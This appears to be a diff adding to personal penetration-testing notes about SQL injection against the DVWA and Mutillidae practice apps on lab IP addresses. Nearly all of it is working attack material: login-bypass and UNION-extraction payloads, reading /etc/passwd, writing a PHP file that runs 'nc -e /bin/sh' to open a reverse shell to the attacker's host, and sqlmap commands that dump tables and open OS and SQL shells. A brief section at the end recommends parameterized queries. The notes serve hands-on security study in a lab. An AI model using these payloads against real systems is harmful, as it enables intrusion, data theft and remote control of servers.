@@ -375,12 +375,188 @@ source
 
 "Bypassing remote file inclusion as (hTTp://...) => hTTp://192.168.104.6/dvwa/vulnerabilities/fi/?page=hTTp://192.168.104.3/reverse.txt"
 
+SQL Injection - Login
+-------------
 
+"Discovering SQL"
 
+"Try to break page, Use 'and', 'order by', '\'', Test text boxes and url parameters on the form"
 
+"Type the following in input field of password"
 
+> 123456' AND 1=1#
 
+SELECT * FROM accounts WHERE username='zaw' AND password='123456' AND 1=1#'
 
+"Type the follwoing in input field of username"
+
+> admin' #
+
+SELECT * FROM accounts WHERE username='admin' #AND password=''
+
+"It will just execute => SELECT * FROM accounts WHERE username='admin'"
+
+> zaw' #
+
+SELECT * FROM accounts WHERE username='zaw' #AND password=''
+
+"It will just execute => SELECT * FROM accounts WHERE username='zaw'"
+
+SQL Injection - Data
+-------------
+
+"Test with Mutillidae Web App Offline => OWASP Top 10 > A1 Injection > SQLi Extract Data > User Info"
+
+> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details
+
+> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' order by 1#&password=123456&user-info-php-submit-button=View+Account+Details
+
+"Replace # with %23"
+
+> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' order by 1%23&password=123456&user-info-php-submit-button=View+Account+Details
+
+> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' %23&password=123456&user-info-php-submit-button=View+Account+Details
+
+"can add this => union select 1,database(),user(),version(),5"
+
+> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw%27%20union%20select%201,database(),user(),version(),5%23&password=123456&user-info-php-submit-button=View+Account+Details
+
+"To fetch tables name => union select 1,table_name,null,null,5 from information_schema.tables where table_schema='owasp10'"
+
+"To fetch columns => union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'"
+
+"To fetch records => union select 1,username,password,is_admin,5 from accounts"
+
+SQL Injection
+-------------
+
+"In DVWA's SQL Injection"
+
+"Input the following in input field"
+
+"Bypass by writing => aND, anD, aNd, /****/,etc"
+
+> 1' aNd /****/ 1=1 #
+
+"Input the following in url field"
+
+> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1%27+aNd+%2F****%2F+1%3D1+%23&Submit=Submit#
+
+> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1' union select 1,2%23&Submit=Submit#
+
+ID: 1' union select 1,2#
+First name: admin
+Surname: admin
+
+ID: 1' union select 1,2#
+First name: 1
+Surname: 2
+
+> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1' union select table_name,2 from information_schema.tables%23&Submit=Submit#
+
+> http://192.168.104.6/dvwa/vulnerabilities/sqli/?id=1' union select 1,table_name from information_schema.tables%23&Submit=Submit#
+
+SQL Injection
+-------------
+
+"In mutillidae"
+
+"Reading /etc/passwd file by SQL Injection"
+
+> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' union select null,load_file('/etc/passwd'),null,null,null %23&password=123456&user-info-php-submit-button=View+Account+Details
+
+"Reading texts to a file by SQL Injection"
+
+"Assume /var/www/mutillidae/ was allow permission to write"
+
+> http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw' union select null,'example example',null,null,null into outfile '/var/www/mutillidae/example.txt' %23&password=123456&user-info-php-submit-button=View+Account+Details
+
+"It can write Net Cat to file by SQL Injection and execute via Web Browser"
+
+"In DVWA"
+
+> union select '<?passthru("nc -e /bin/sh [your_ip_address] [your_port]");?>',null into outfile '/tmp/reverse.php'
+
+"Listen from your device"
+
+> nc -vv -l -p [your_port]
+
+"Execute via Web Browser"
+
+> [target_domain]/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse.php
+
+SQL Injection - SQL Map
+-------------
+
+"Tool designed to exploit sql injections."
+"Works with many databases types (MySQL, MSSQL, etc)."
+
+> sqlmap --help
+> sqlmap -u [target_url]
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details"
+
+"The following command exploit databases"
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --dbs
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --current-user
+
+"The following command exploit current database"
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --current-db
+
+"The following command exploit tables of current database"
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --tables -D [database_name]
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --tables -D owasp10
+
+"The following command exploit columns of table of current database"
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --columns -T [table_name]
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --columns -T accounts
+
+"The following command query all records in table"
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" -T [table_name] -D [database_name] --dump
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" -T accounts -D owasp10 --dump
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --os-shell
+
+"The following command is for executing SQL Shell"
+
+> sqlmap -u "http://192.168.104.6/mutillidae/index.php?page=user-info.php&username=zaw&password=123456&user-info-php-submit-button=View+Account+Details" --sql-shell
+
+sql-shell > current_user()
+sql-shell > user()
+sql-shell > database()
+sql-shell > select table_name from information_schema.tables where table_schema = [table_name] [6];
+sql-shell > select table_name from information_schema.tables where table_schema = 'owasp10' [6];
+
+SQL Injection - Prevention
+------------
+
+"Filters, Using black list of commands, Using white list of commands can be bypassed."
+"Use parameterized statements and separate data from SQL code."
+
+Example:
+
+Psue-do-code
+
+<?php
+
+$user_name = admin' union select ... #
+
+select * from accounts where username=$user_name
+
+"Use the following instead of above"
+
+Safe:
+    ->prepare("select * from accounts where username = ?")
+    ->execute(array('$user_name'))
 
 
 
